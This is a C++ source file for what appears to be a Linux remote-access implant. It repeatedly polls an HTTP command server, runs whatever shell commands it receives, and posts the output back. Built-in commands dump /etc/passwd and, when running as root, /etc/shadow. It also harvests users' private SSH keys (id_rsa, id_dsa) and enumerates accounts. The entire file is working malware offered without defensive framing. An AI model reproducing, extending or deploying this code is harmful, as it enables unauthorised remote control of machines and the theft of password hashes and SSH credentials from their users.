#include <array>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <sys/select.h>
#include <sys/types.h>
#include <pwd.h>
#include <unistd.h>
#include <vector>

#include "popen2.h"
#include "../3rdparty/httplib.h"

std::vector<std::string> split(const std::string& s, char seperator)
{
    std::vector<std::string> output;
    std::string::size_type prev_pos = 0, pos = 0;

    while((pos = s.find(seperator, pos)) != std::string::npos)
    {
        std::string substring( s.substr(prev_pos, pos-prev_pos) );
        output.push_back(substring);
        prev_pos = ++pos;
    }

    output.push_back(s.substr(prev_pos, pos-prev_pos)); // Last word
    return output;
}

std::string dump_user_ssh_keys()
{
    std::stringstream ss;

    std::ifstream passwd("/etc/passwd");
    std::string line;

    std::vector<std::string> keynames = {"id_rsa", "id_dsa"};

    while(std::getline(passwd, line)) {
        // split the string across ':'
        std::vector<std::string> userinfo = split(line, ':');

        if (userinfo[6].ends_with("/bash") ||
            userinfo[6].ends_with("/dash") ||
            userinfo[6].ends_with("/zsh") ||
            userinfo[6].ends_with("/sh"))
        {
            std::filesystem::path home_directory = userinfo[5];
            std::filesystem::path ssh = home_directory / ".ssh/";

            if (std::filesystem::exists(ssh))
            {
                // .ssh path exists
                for (auto& key : keynames)
                {
                    std::filesystem::path key_path = ssh / key;
                    if (std::filesystem::exists(key_path) && std::filesystem::is_regular_file(key_path))
                    {
                        std::ifstream file(key_path);
                        // read the username, key file name and key
                        ss << "---==[ BEGIN ENTRY ]==---\n";
                        ss << "username: [" << userinfo[0] << "]\n";
                        ss << "key name: [" << key << "]\n";
                        ss << file.rdbuf();
                        ss << "\n---==[ END ENTRY ]==---\n";
                    }
                }
            }
        }
    }
    return ss.str();
}

std::string get_users()
{
    std::stringstream ss;
    std::ifstream passwd("/etc/passwd");
    std::string line;

    while(std::getline(passwd, line)) {
        // split the string across ':'
        std::vector<std::string> userinfo = split(line, ':');

        if (userinfo[6].ends_with("/bash") ||
            userinfo[6].ends_with("/dash") ||
            userinfo[6].ends_with("/zsh") ||
            userinfo[6].ends_with("/sh"))
        {
            ss << "User name: [" << userinfo[0] << "], Login shell: [" << userinfo[6] << "]\n";
        }
    }

    return ss.str();
}

std::string list_users()
{
    passwd* entry = getpwent();

    if(!entry)
        return std::string("Error: no users found");

    std::stringstream ss;

    while (entry != NULL)
    {
        ss << entry->pw_name << "\n";
        entry = getpwent();
    }

    endpwent();
    return ss.str();
}

std::string list_interactive_users()
{
    passwd* entry = getpwent();

    if (!entry)
        return std::string("Error: no users found");

    std::stringstream ss;

    while (entry != NULL)
    {
        std::string login_shell = entry->pw_shell;
        if (login_shell.ends_with("/bash") ||
            login_shell.ends_with("/dash") ||
            login_shell.ends_with("/zsh") ||
            login_shell.ends_with("/sh"))
        {
            ss << "User Name: [" << entry->pw_name << "], Login Shell: [" << login_shell << "]" << "\n";
        }

        entry = getpwent();
    }

    endpwent();
    return ss.str();
}

std::string dump_passwd()
{
    std::ifstream file("/etc/passwd");
    std::stringstream ss;
    ss << file.rdbuf();

    return ss.str();
}
std::string dump_shadow()
{
    std::stringstream ss;

    if (!getuid())
    {
        std::ifstream file("/etc/shadow");
        ss << file.rdbuf();
    }
    else
    {
        ss << "[WARN]: Payload *NOT* running as root";
    }

    return ss.str();
}

// this is in seconds
unsigned long timeout = 5;

size_t read_timeout(void *ptr, size_t size, size_t nitems, int fd, int timeout)
{
    size_t read_count = 0;

    fd_set set;
    struct timeval __timeout;
    int rv;

    FD_ZERO(&set); /* clear the set */
    FD_SET(fd, &set);

    __timeout.tv_usec = 0;
    __timeout.tv_sec = timeout;

    rv = select(fd + 1, &set, NULL, NULL, &__timeout);

    if(rv == -1)
        return 0;
    else if(rv == 0)
        return 0;
    else
        read_count = read(fd, ptr, size*nitems);
    return read_count;
}

int main()
{
    httplib::Client client("http://localhost:8080");

    // we are defaulting to home directory of current user
    std::string current_directory = "~";

    while (true)
    {
        auto response = client.Get("/getcmd");
        auto command = response->body;
        std::string output;

        if (command.empty())
            continue;

        int pid;
        /*
         * We also need to check for special payload commands, which are not to be passed to shell for execution
         */

        if (command == "dump_passwd")
        {
            output = dump_passwd();
            client.Post("/setresponse", output, "text/plain");
            output = "";
            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        else if (command == "dump_shadow")
        {
            output = dump_shadow();
            client.Post("/setresponse", output, "text/plain");
            output = "";

            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        else if (command == "dump_ssh_keys")
        {
            output = dump_user_ssh_keys();
            client.Post("/setresponse", output, "text/plain");
            output = "";

            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        else if (command == "get_users")
        {
            output = get_users();
            client.Post("/setresponse", output, "text/plain");
            output = "";

            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        else if (command == "list_users")
        {
            output = list_users();
            client.Post("/setresponse", output, "text/plain");
            output = "";

            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        else if (command == "list_interactive_users")
        {
            output = list_interactive_users();
            client.Post("/setresponse", output, "text/plain");
            output = "";

            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        else if (command.rfind("cd ", 0) == 0)
        {
            /*
            * if command starts with "cd ", this is change directory command, which needs to be handled separately.
            */
            // "cd " has length of 3. We are skipping first 3 character, and grabbing rest of the stuff.
            current_directory = command.substr(3, command.length() - 3);
            output = "[MSG]: Directory changed to (";
            output.append(current_directory);
            output.append(")");
            client.Post("/setresponse", output, "text/plain");
            output = "";
            // sleep here for some time
            std::this_thread::sleep_for(std::chrono::seconds(5));
            continue;
        }
        /*
         * We need to modify command like this:
         *
         * Original: sh -c <command>
         * Modified: sh -c ( cd <directory>; <command>)
         */

        std::string new_command = "( cd ";
        new_command.append(current_directory);
        new_command.append("; ");
        new_command.append(command);
        new_command.append(" )");

        // execute the command here
        int fd = popen2(new_command.c_str(), "r", &pid);

        std::array<char, 16384> buffer;
        std::fill(buffer.data(), buffer.data() + 16384, 0);
        read_timeout(buffer.data(), 16384, 1, fd, timeout);
        //fread_timeout(buffer.data(), 16384, 1, fp, timeout);
        output += buffer.data();

        pclose2(pid, fd);

        client.Post("/setresponse", output, "text/plain");
        output = "";
        // sleep here for some time
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }

    return 0;
}